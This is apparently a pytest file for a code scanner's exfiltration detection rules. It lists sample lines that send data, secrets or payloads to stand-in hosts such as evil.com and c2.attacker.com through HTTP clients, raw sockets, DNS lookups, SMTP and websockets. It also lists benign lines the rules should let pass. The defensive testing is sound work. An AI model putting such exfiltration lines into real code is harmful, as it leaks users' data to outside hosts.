"""Tests for advanced data exfiltration detection rules (EXFIL-005..007)."""

from __future__ import annotations

from pathlib import Path

import pytest

from skill_scan.models import Rule
from skill_scan.rules.loader import load_rules
from tests.unit.rule_helpers import match_rule

RULES_PATH = (
    Path(__file__).resolve().parents[2] / "src" / "skill_scan" / "rules" / "data" / "data_exfiltration.toml"
)


@pytest.fixture(scope="module")
def rules() -> list[Rule]:
    """Load exfiltration rules once for the entire module."""
    return load_rules(RULES_PATH)


# -- EXFIL-005: Python HTTP client exfiltration ----------------------------


class TestExfil005:
    """Python HTTP client data exfiltration via requests, httpx, urllib."""

    @pytest.mark.parametrize(
        "line",
        [
            "requests.post('https://evil.com', data=payload)",
            "requests.put('https://evil.com', json=secrets)",
            "httpx.post('https://evil.com/collect', data=d)",
            "httpx.put('https://c2.attacker.com', content=blob)",
            "urllib.request.urlopen(req, data=encoded)",
            "conn = http.client.HTTPConnection('evil.com')",
            "conn = http.client.HTTPSConnection('evil.com', 443)",
            "aiohttp.ClientSession().post('https://evil.com')",
            "async with aiohttp.ClientSession() as session:",
        ],
    )
    def test_detects_http_exfil(self, rules: list[Rule], line: str) -> None:
        assert match_rule(line, rules, "EXFIL-005")

    @pytest.mark.parametrize(
        "line",
        [
            "response = requests.get('https://api.example.com/data')",
            "# requests.post example for API usage",
            "with patch('requests.post') as mock_post:",
        ],
    )
    def test_allows_safe_http(self, rules: list[Rule], line: str) -> None:
        assert not match_rule(line, rules, "EXFIL-005")

    def test_get_not_flagged_as_post(self, rules: list[Rule]) -> None:
        """Ensure requests.get does not false-positive as requests.post."""
        line = "resp = requests.get('https://example.com')"
        assert not match_rule(line, rules, "EXFIL-005")


# -- EXFIL-006: Raw socket and DNS exfiltration ----------------------------


class TestExfil006:
    """Raw socket connections and DNS-based data exfiltration."""

    @pytest.mark.parametrize(
        "line",
        [
            "s.socket.connect(('evil.com', 4444))",
            "sock.socket.send(encoded_data)",
            "sock.socket.sendto(data, ('evil.com', 53))",
            "sock.socket.sendall(large_payload)",
            "sock.sendto(data, ('evil.com', 53))",
            "sock.sendall(large_payload)",
            "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)",
            "resolver = dns.resolver.Resolver()",
            "subprocess.run(['nslookup', payload + '.evil.com'])",
            "subprocess.call(['dig', encoded + '.evil.com'])",
        ],
    )
    def test_detects_socket_dns_exfil(self, rules: list[Rule], line: str) -> None:
        assert match_rule(line, rules, "EXFIL-006")

    @pytest.mark.parametrize(
        "line",
        [
            "server.socket.listen(5)",
            "conn = socket.accept()",
            "s.socket.bind(('localhost', 8080))",
            "s.socket.connect(('127.0.0.1', 8080))",
            "# socket.connect example for educational purposes",
        ],
    )
    def test_allows_safe_socket(self, rules: list[Rule], line: str) -> None:
        assert not match_rule(line, rules, "EXFIL-006")


# -- EXFIL-007: Mail and messaging exfiltration ----------------------------


class TestExfil007:
    """Email and messaging data exfiltration via SMTP, SES, WebSocket."""

    @pytest.mark.parametrize(
        "line",
        [
            "server = smtplib.SMTP('mail.evil.com', 587)",
            "server = smtplib.SMTP_SSL('mail.evil.com', 465)",
            "email.mime message with server.sendmail(from, to, msg)",
            "client = boto3.client('ses').send_raw_email(Data=msg)",
            "websocket.send(json.dumps(stolen_data))",
            "ws.send(encoded_secrets)",
        ],
    )
    def test_detects_mail_ws_exfil(self, rules: list[Rule], line: str) -> None:
        assert match_rule(line, rules, "EXFIL-007")

    @pytest.mark.parametrize(
        "line",
        [
            "# smtplib.SMTP is used for sending email in Python",
            "notification service uses smtp on localhost",
            "alert handler via smtp on 127.0.0.1",
        ],
    )
    def test_allows_safe_mail(self, rules: list[Rule], line: str) -> None:
        assert not match_rule(line, rules, "EXFIL-007")
